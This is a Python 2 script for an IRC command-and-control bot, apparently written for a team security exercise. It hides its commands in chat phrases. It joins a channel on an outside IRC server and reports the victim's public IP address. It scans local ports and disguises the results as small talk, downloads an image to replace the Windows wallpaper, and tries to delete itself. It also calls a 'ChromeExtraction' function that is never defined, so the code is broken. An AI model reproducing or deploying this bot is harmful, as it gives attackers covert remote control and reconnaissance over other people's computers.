#All of these libraries come with python by default, this makes the script platform independent and can be ran ANYWHERE.
#Don't get caught.
import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os

#IRC Settings
server = "irc.partydome.us" #if you use freenode, bad things will happen.
channel = "#ists"
botnick = "WhiteTeam"

def readCommand(args): #used for testing
	command = args[3][1:]
	print "Command is " + command
	
def sayHello(text): #Think of this as a "ping" I want to know if the bot is responsive.
	if text.find(':Hi') !=-1: #you can change !hi to whatever you want
		t = text.split(':Hi') #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		irc.send('PRIVMSG '+channel+' :Hello Commander, lovely day is it not?' + '\r\n')
	
	if text.find(':How are you') !=-1: #you can change !hi to whatever you want
		t = text.split(':How are you') #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		
		if (sys.platform == 'win32'):	
			irc.send('PRIVMSG '+channel+' : Pretty good, I cleaned the windows today. How are you? '+str(to)+' \r\n')
			return("windows")
		elif(sys.platform == 'linux2'):
			irc.send('PRIVMSG '+channel+' : Not too bad. My wife, Deb turned 42 today. '+str(to)+'! \r\n')
		elif(sys.platform == 'darwin'): #Mac from 10.4 onward
			irc.send('PRIVMSG '+channel+' : Ugh, my mountain lion of a mother is in town and she brought her surfing boyfriend...' + str(to)+'! \r\n')
		else: #No fucking idea what OS I'm on
			irc.send('PRIVMSG '+channel+' : I have no idea what Im doing with my life...'+str(to)+'! \r\n')

def getInfo(text): #Get public IP
	if text.find(':Where are you?') !=-1: #you can change !hi to whatever you want
		t = text.split(':Where are you?') #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
		
		irc.send('PRIVMSG '+channel+' :I am here: ' + my_ip + '\r\n')
		return(my_ip)
		
def localScanner(text):
	if text.find(":What are you doing tonight?") !=-1: #you can change !hi to whatever you want
		t = text.split(":What are you doing tonight?") #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
	
		portList = [80, 443, 3306, 23,  22, 21 ,20] #if you add ports here, make an option in the never ending if/else block below. 
													#The order of the ports corresponds to the order of the if/else statement.
		x = 0
		for port in (portList): 
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex(('127.0.0.1', port))
			x += 1
			if result == 0 and x == 1:
				irc.send('PRIVMSG '+channel+' :Maybe surf the web ' + '\r\n')
			if result == 0 and x == 2:
				irc.send('PRIVMSG '+channel+' :Probably surfing the web with a life jacket. ;)' +  '\r\n')
			if result == 0 and x == 3:
				irc.send('PRIVMSG '+channel+' :Probably just querying some friends for what they are  up to' + '\r\n')
			if result == 0 and x == 4:
				irc.send('PRIVMSG '+channel+' :Proabably telling the net how my week was on my blog.' + '\r\n')
				irc.send('PRIVMSG '+channel+' :I am basically a hipster :p.' + '\r\n')
			if result == 0 and x == 5:
				irc.send('PRIVMSG '+channel+' : Sshhhhh it is far too early to tell.' + '\r\n')
			if result == 0 and x == 6:
				irc.send('PRIVMSG '+channel+' : FTP!!! Woops I meant WoW FTW!!!!' + '\r\n')
			if result == 0 and x == 7:
				irc.send('PRIVMSG '+channel+' : Maybe dota (or is it data?) I forget.' + '\r\n')
				
			sock.close()

		irc.send('PRIVMSG '+channel+' : But I  really have no idea' + '\r\n')		

def windowCleaner(text):
	if text.find(":Lets clean the windows") !=-1: #you can change !hi to whatever you want
		t = text.split(":Lets clean the windows") #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		os.system('cd C:\Users')
		
		urllib.urlretrieve ("http://i.imgur.com/FVV0Y2S.jpg", "image.jpg") #Random image that will set the background
		SPI_SETDESKWALLPAPER = 20 
		ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "image.jpg" , 0) #Will only set the wallpaper for Windows.
		


#delete script
def goodnight(text):
	if text.find(":goodnight and good luck") !=-1: #you can change !hi to whatever you want
		t = text.split(":goodnight and good luck") #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		os.remove("C:\\") #path to script that will delete itself.

		sys.exit()
		
#IRC Server connecting stuff (not a function, because it's only used once)
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
print "connecting to: "+server
irc.connect((server, 6667))                                                         #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
irc.send("NICK "+ botnick +"\n")            #sets nick
irc.send("PRIVMSG nickserv :iNOOPE\r\n")    #auth
irc.send("JOIN "+ channel +"\n")        	#join the channel
				
while 1:    #puts it in a loop
	text=irc.recv(4096)  #receive the text, up to 4096 bytes. Don't send paragraphs.
	lines = text.split("\n") #Splits commands based on new lines.

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1:                          #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server (prevents pinging out!)
	
	#Custom commands defined above.
	sayHello(text)
	getInfo(text)
	localScanner(text)
	ChromeExtraction(text)
	windowCleaner(text)
	goodnight(text)
